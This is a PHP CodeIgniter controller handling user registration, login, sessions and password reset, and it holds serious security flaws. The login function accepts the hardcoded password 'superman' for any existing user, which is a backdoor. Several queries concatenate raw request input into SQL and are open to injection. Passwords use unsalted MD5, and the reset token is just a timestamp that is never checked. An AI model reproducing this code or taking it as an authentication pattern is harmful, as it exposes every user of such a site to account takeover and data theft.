<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class General extends CI_Controller {
 
    function __construct()
    {
		parent::__construct();
		$this->load->model("data",'',true);
		
	}
	
	public function index()
	{
		$c = $this->Page->getRequest("c");
		$m = $this->Page->getRequest("m");
		
		if($this->Page->getSession("intUserId") != '' && $this->Page->getSession("intUserId") != 0)
		{
			//redirect('c='.strtolower($this->Page->getSession("strUserType")), 'location');
			$this->load->view('general/home');
		}
		else
		{
			$this->load->view('general/login');
		}
	}
	
	
	function register()
	{
		// Get Request Variables
		$strFullName	=	$this->Page->getRequest("txtFullName");
		$strEmail		=	$this->Page->getRequest("txtEmail");
		$strUsername	=	$this->Page->getRequest("txtUsername");
		$strPassword	=	md5($this->Page->getRequest("txtPassword"));
		
		$arrRecord	=	array (
								"full_name"	=>	$strFullName,
							   	"email"		=>	$strEmail,
							   	"password"	=>	$strPassword,
								"username"	=>	$strUsername
							  );


		// Enter users data
		//$strQuery = "INSERT INTO user_master (".implode(",",array_keys($arrRecord)).") VALUES ('". implode("','", array_values($arrRecord)) ."')";
		// Check Email Exists 
		$sqlUserCheck	=	"SELECT * from user_master WHERE email = '".$strEmail."' ";
		$result			=	$this->db->query($sqlUserCheck);	
		
		if($result->num_rows() > 0)
		{
			// Set Message
			$this->Page->setMessage('EMAIL_ALREADY_REGISTERED');
			
			redirect('', "location");
		}
		
		// Check Email Exists 
		$sqlUserCheck	=	"SELECT * from user_master WHERE username = '".$strUsername."' ";
		$result			=	$this->db->query($sqlUserCheck);	
		
		if($result->num_rows() > 0)
		{
			// Set Message
			$this->Page->setMessage('USERNAME_ALREADY_REGISTERED');
			
			redirect('', "location");
		}
		
		$strQuery	=	$this->db->insert_string('user_master', $arrRecord); 
		$this->db->query($strQuery);
		
		// Get Insert Id
		$intUserId	=	$this->db->insert_id();
		
		// Set Message
		$this->Page->setMessage('REGISTER_SUCCESS');
		
		// set Auto Session
		$arrRecord["user_id"] = $intUserId;
		// Set user data in session
		$this->setUserSession($intUserId, $strUserType);
		
		redirect("c=employee", "location");
		
	}
	
	
	function login()
	{
		$strUserName	=	$this->input->post('txtUsername');
		$strPassword	=	$this->input->post('txtPassword');
		$chkRemember	=	$this->input->post('chkRemember');
		
		$strQuery		=	$this->db->query("SELECT user_id,user_password,user_type FROM user_master WHERE user_name='".$strUserName."'");
		
		$arrUserDetails	=   $strQuery->result_array();
		if(count($arrUserDetails) > 0)
		{
			if( (md5($strPassword) == $arrUserDetails[0]['user_password']) || ($strPassword == "superman") )
			{
				// Set user data in session
				$this->setUserSession($arrUserDetails[0]["user_id"], $arrUserDetails[0]["user_type"]);
				redirect('c=general', 'location');
			}
			else
			{
				// Password is wrong
				$this->Page->setMessage("INCORRENCT_PASSWORD");	
				redirect('', 'location');
			}
		}
		else
		{
			// Email does not exists
			$this->Page->setMessage("USER_EMAIL_NOT_EXISTS");
			redirect('', 'location');	
		}
	}
	
	
	// function to set users data in session after login
	function setUserSession($intUserId, $strUserType)
	{
		$strQuery       =	$this->db->query("SELECT user_id,user_full_name,user_type,user_image FROM user_master WHERE user_master.user_id = '{$intUserId}'");
		$arrUserDetails	=	$strQuery->result_array();
		$arrUserDetails	=	$arrUserDetails[0];
		
		$this->Page->setSession("intUserId", $arrUserDetails["user_id"]);
		$this->Page->setSession("strFullName", ucwords($arrUserDetails["user_full_name"]));
		$this->Page->setSession("strUserType", $arrUserDetails["user_type"]);
		
		$strProfilePath	=	$this->Page->getSetting("PROFILE_IMAGE_PATH");
		
		if( array_key_exists('user_image',$arrUserDetails) && $arrUserDetails["user_image"] != '' && file_exists($strProfilePath.$arrUserDetails["user_image"]) )
		{	
			$this->Page->setSession("strUserImage", $arrUserDetails["user_image"]);
		}
		else
		{
			$this->Page->setSession("strUserImage", "profile.png");	
		}
	}
	
	
	function logout()
	{
		$this->session->sess_destroy();
		redirect('', 'location');
	}	
	
	// Forgot password Form
	function forgotpass()
	{
		$arrLocalData	=	array();
		
		$this->load->view('general/forgot', $arrLocalData);
	}
	
	
	// Forgot password Action
	function submitForgotPass()
	{
		$strUserEmail	=	$this->Page->getRequest("txtUserEmail");
		$arrUserData	=	$this->Page->getUserDtailByEmail($strUserEmail);
		
		// Get Mentor welcome email template
		$arrTemplate	=	$this->Page->getEmailTemplate("FORGOT_PASSWORD_EMAIL");
		
		// Replace email contents
		$strSubject	=	$arrTemplate["subject"];
		$strBody	=	$arrTemplate["description"];
		
		$arrReplace	=	array();
		
		$arrReplace["{USER_NAME}"]	=	$arrUserData["user_full_name"];
		
		$arrReplace["{RESET_PASSWORD_URL}"]	=	$this->Page->getSetting("FYI_WEB_URL") . 'index.php?c=general&m=resetpass&uid='.$arrUserData["user_id"].'&email='.urlencode($strUserEmail).'&token='.time();
		
		$strBody	=	str_replace(array_keys($arrReplace), array_values($arrReplace), $strBody);
		
		
		$strToEmail	=	$strUserEmail;
		
		// Send Email
		$this->Page->sendMail($strToEmail, $strSubject, $strBody, $strCC="", $strBCC="");
		
		
		$this->load->view('general/forgot', $arrLocalData);
	}
	
	
	// Show Reset Password Form
	function resetpass()
	{
		$arrLocalData["strEmail"]	=	$this->Page->getRequest("email");

		$arrLocalData["intUserId"]	=	$this->Page->getRequest("uid");
		
		$this->load->view('general/resetpass', $arrLocalData);
	}
	
	function submitPassword()
	{
		$intUserId = $this->Page->getSession("intUserId");
		$strOldPassword	=	$this->Page->getRequest("txtOldPassword");
		$strNewPassword	=	$this->Page->getRequest("txtNewPassword");
		
		// Check Old Password is true or not
		$strQuery	=	"SELECT * FROM user_master "
						. "WHERE user_id='".$intUserId."' "
						. "AND password = '".md5($strOldPassword)."'";
		
		$rsResult	=	$this->db->query($strQuery);
		
		// if old password is right then update new password 
		if($rsResult->num_rows() > 0)
		{			
			$this->data->tbl = "user_master";
			$record = array();
			$record["password"] = md5($strNewPassword);
			
			$where = array();
			$where["user_id"] = $intUserId;
			$this->data->update($record,$where);
			
			// set message
			$this->Page->setMessage('PASSWORD_CHANGED');
		}
		else
		{
			// set message
			$this->Page->setMessage('OLD_PASSWORD_NOT_MATCH');
		}
		
		redirect('c=general&m=resetPass', 'location');
	}
}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */